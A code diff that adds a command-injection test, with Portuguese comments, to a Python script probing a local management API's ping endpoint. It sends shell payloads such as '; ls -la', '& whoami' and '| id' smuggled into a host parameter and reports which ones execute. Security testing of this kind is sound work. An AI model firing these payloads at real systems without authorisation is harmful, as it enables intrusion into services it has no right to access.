@@ -41,3 +41,26 @@ try:
 
 except requests.exceptions.RequestException as e:
     print(f"[-] Erro ao se conectar à API: {e}")
+
+#--Teste de Command Injection ---
+NF_MGMT_URL = "https://127.0.0.1:8000/management/ping" #Exemplo de API de gerenciamento
+TARGET_CMD_PARAM = "host"
+injection_commands = ["; ls -la", "& whoami", "| id"]
+
+print("\n[+] Testando Command Injection...")
+
+for command in injection_commands:
+    payload = {TARGET_CMD_PARAM: f"127.0.0.1{command}"}
+    print(f"[*] Enviando payload: {payload}")
+    try:
+        response = requests.post(NF_MGMT_URL, headers={"Content-Type": "application/json"}, data=json.dumps(payload), verify=False)
+        if "total" in response.text or "uid=" in response.text or "root" in response.text:
+            print(f"[!!!] Command Injection detectada! Payload '{command}' funcionou")
+            print(f"[*] Resposta da API: {response.text[:200]}...")
+            break
+
+        else:
+            print(f"[-] Comando '{command}' não parece ser executado.")
+
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Erro de conexão ao testar o comando '{command}': {e}")
